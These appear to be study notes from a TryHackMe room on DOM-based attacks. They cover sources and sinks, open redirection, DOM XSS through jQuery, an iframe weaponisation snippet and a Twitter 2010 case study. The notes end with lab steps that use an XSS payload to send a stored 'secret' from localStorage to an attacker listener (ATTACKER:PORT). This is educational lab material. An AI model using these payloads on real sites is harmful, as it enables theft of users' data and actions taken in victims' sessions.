# TASK 4: DOM-Based Attacks

DOM-Based Attacks occur when user input is not properly validated or sanitized before being used in JavaScript to modify the DOM. Modern web apps rely heavily on client-side controls, making it essential to secure them to prevent these attacks.

## The Blind Server-Side

DOM-based attacks happen when user input is not properly validated or sanitized before being used in JavaScript to change the DOM. Modern web apps often update the DOM without new server requests, so client-side validation is crucial. If security checks are only server-side, these attacks can bypass them.

## The Source and the Sink

Sources are where user input enters JavaScript; sinks are where that input is used to update the DOM. Without validation between source and sink, DOM-based attacks can occur. Examples:

| Example | Source | Sink |
|---------|--------|------|
| User clicking a tab on the navigation pane | Developer updates the URL with #tabname2 to indicate active tab | JavaScript recovers tab info from URL and displays correct tab |
| User filtering the results of a table | User input in textbox used to filter results | JavaScript uses textbox input to filter the dataset |

The first example shows how a mouse click updates the URL with a fragment (#), commonly used to indicate page state. JavaScript reads this fragment to restore the user's view. While useful, if not validated, this can allow DOM-based attacks by injecting malicious data into the URL.

## DOM-based Open Redirection

Using the URL fragment (#) for navigation can lead to DOM-based open redirects. Example:
Example JavaScript for DOM-based open redirection:

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
    location = goto;
}
```

`location.hash` is the source and `location` is the sink. An attacker can use a URL like:
https://realwebsite.com/#https://attacker.com
This redirects users to a malicious site because user input is used without validation.

---

# TASK 5: DOM-Based XSS

DOM-based XSS lets attackers inject JavaScript via user-controlled sources like `window.location.hash`. Fragments are often ignored by the server but used in the DOM, enabling XSS if not validated.

## DOM-based XSS via jQuery

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

`location.hash` is the source, and jQuery's `$()` selector is the sink. An attacker can use:
https://realwebsite.com#<img src=1 onerror=alert(1)>

To weaponize, use an iframe to trigger the payload for others.

```html
<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

The iframe changes its src to add the payload, triggering XSS.
Other JavaScript sinks can be exploited. Weaponizing DOM XSS lets attackers target others, not just themselves.

## DOM-Based XSS vs Conventional XSS

- **Conventional XSS**: Injection happens server-side.
- **DOM-based XSS**: Injection happens client-side via JavaScript.
- **Fixes**: Server-side encoding for conventional; client-side validation for DOM-based.

---

# TASK 6: XSS Weaponisation

## Weaponising DOM-based XSS

To weaponise DOM-based XSS, you need a delivery method—either stored or reflected. Without this, the attack only affects yourself. Stored XSS is often more reliable, as reflected XSS can be blocked by browser encoding.

Weaponisation means going beyond alert boxes or stealing cookies (which may be protected by HTTPOnly). With XSS, you can make the victim’s browser perform actions as the user—like sending requests, changing data, or stealing information from other pages.

## Case Study: Twitter 2010

Twitter had a DOM-based XSS where the URL fragment after #! was assigned to `window.location` without validation:

```javascript
(function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a;}})(window);
```

Attackers used this to inject JavaScript and create a worm that retweeted itself and redirected users. This shows how DOM XSS can be weaponised to cause real impact.

---

# TASK

1. Try inserting `<script>alert("Hello")</script>` on input Title and Date. One contains XSS vulnerability.
2. Bday.vue contains removeBdat API `http://lists.tryhackme.loc:5001/bdays/${bdayID}?secret=`
3. Run python server as listener.
4. Get bdayID at `http://lists.tryhackme.loc:5001/bdays`
5. Get secret with XSS payload `<img src=1 onerror="setInterval(() => {fetch('http://ATTACKER:PORT?secret=' + localStorage.getItem('secret')), {method: 'GET'}}, 5000)">`
6. Receive actual secret through listener. Replace it and delete through web page.

---

# Appendix